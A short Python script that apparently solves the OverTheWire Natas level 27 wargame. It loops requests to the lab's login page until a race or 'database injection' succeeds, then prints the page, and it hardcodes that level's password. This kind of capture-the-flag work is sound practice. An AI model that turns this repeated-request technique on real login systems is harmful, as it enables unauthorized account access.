# -*- coding: utf8 -*-

import requests

url = "http://natas27.natas.labs.overthewire.org/index.php?username=natas28&password=bite"
auth = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")

done = False

while not done:
    r = requests.get(url, auth=auth)
    if "Wrong password" not in r.text:
        done = True

print("database injection success!")

r = requests.get(url, auth=auth)
print(r.text)
